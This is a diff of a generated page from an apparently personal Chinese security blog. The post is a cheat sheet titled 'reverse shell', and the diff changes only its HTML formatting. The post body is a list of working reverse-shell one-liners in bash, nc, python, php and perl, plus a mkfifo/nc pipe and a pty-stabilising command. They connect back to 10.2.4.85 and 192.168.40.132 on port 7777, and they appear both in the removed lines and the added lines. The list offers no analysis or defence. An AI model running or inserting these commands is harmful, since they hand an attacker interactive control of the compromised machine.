@@ -86,17 +86,17 @@
 
 
 
-<meta name="description" content="反弹后稳定shell：python -c ‘import pty; pty.spawn(“/bin/bash”);’   bash -i &amp;gt;&amp;amp; /dev/tcp/10.2.4.85/7777 0&amp;gt;&amp;amp;1 nc -nv 10.2.4.85 7777 -e /bin/bash python -c “import os,socket,subprocess;s=socket.so">
+<meta name="description" content="12345678910111213141516171819202122232425反弹后稳定shell：python -c &amp;apos;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;);&amp;apos;  bash -i &amp;gt;&amp;amp; /dev/tcp/10.2.4.85/7777 0&amp;gt;&amp;amp;1nc -nv 10.2.4.85 7777 -e /">
 <meta property="og:type" content="article">
 <meta property="og:title" content="反弹shell">
 <meta property="og:url" content="http://yoursite.com/2019/10/16/r-shell/index.html">
 <meta property="og:site_name" content="L1e&#39;s blog">
-<meta property="og:description" content="反弹后稳定shell：python -c ‘import pty; pty.spawn(“/bin/bash”);’   bash -i &amp;gt;&amp;amp; /dev/tcp/10.2.4.85/7777 0&amp;gt;&amp;amp;1 nc -nv 10.2.4.85 7777 -e /bin/bash python -c “import os,socket,subprocess;s=socket.so">
+<meta property="og:description" content="12345678910111213141516171819202122232425反弹后稳定shell：python -c &amp;apos;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;);&amp;apos;  bash -i &amp;gt;&amp;amp; /dev/tcp/10.2.4.85/7777 0&amp;gt;&amp;amp;1nc -nv 10.2.4.85 7777 -e /">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-10-16T03:23:48.107Z">
+<meta property="og:updated_time" content="2019-10-16T06:42:58.057Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="反弹shell">
-<meta name="twitter:description" content="反弹后稳定shell：python -c ‘import pty; pty.spawn(“/bin/bash”);’   bash -i &amp;gt;&amp;amp; /dev/tcp/10.2.4.85/7777 0&amp;gt;&amp;amp;1 nc -nv 10.2.4.85 7777 -e /bin/bash python -c “import os,socket,subprocess;s=socket.so">
+<meta name="twitter:description" content="12345678910111213141516171819202122232425反弹后稳定shell：python -c &amp;apos;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;);&amp;apos;  bash -i &amp;gt;&amp;amp; /dev/tcp/10.2.4.85/7777 0&amp;gt;&amp;amp;1nc -nv 10.2.4.85 7777 -e /">
 
 
 
@@ -358,16 +358,7 @@
       
 
       
-        <p>反弹后稳定shell：python -c ‘import pty; pty.spawn(“/bin/bash”);’  </p>
-<p>bash -i &gt;&amp; /dev/tcp/10.2.4.85/7777 0&gt;&amp;1</p>
-<p>nc -nv 10.2.4.85 7777 -e /bin/bash</p>
-<p>python -c “import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((‘10.2.4.85’,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([‘/bin/bash’,’-i’]);”</p>
-<p>nc -e /bin/bash 192.168.40.132 7777</p>
-<p>php -r ‘exec(“/bin/bash -i &gt;&amp; /dev/tcp/10.2.4.85/7777”);’</p>
-<p>php -r ‘$sock=fsockopen(“192.168.40.132”,7777);exec(“/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p>
-<p>perl -e ‘use Socket;$i=”192.168.40.132”;$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</p>
-<p>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.2.4.85 7777 &gt;/tmp/f</p>
-
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">反弹后稳定shell：python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;);&apos;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.2.4.85/7777 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nc -nv 10.2.4.85 7777 -e /bin/bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&apos;10.2.4.85&apos;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&apos;/bin/bash&apos;,&apos;-i&apos;]);&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nc -e /bin/bash 192.168.40.132 7777</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">php -r &apos;exec(&quot;/bin/bash -i &gt;&amp; /dev/tcp/10.2.4.85/7777&quot;);&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">php -r &apos;$sock=fsockopen(&quot;192.168.40.132&quot;,7777);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">perl -e &apos;use Socket;$i=&quot;192.168.40.132&quot;;$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.2.4.85 7777 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
       
     </div>
     
@@ -400,6 +391,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/10/16/include-smb/" rel="prev" title="RFI绕过URI包含限制">
+                RFI绕过URI包含限制 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -469,7 +464,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
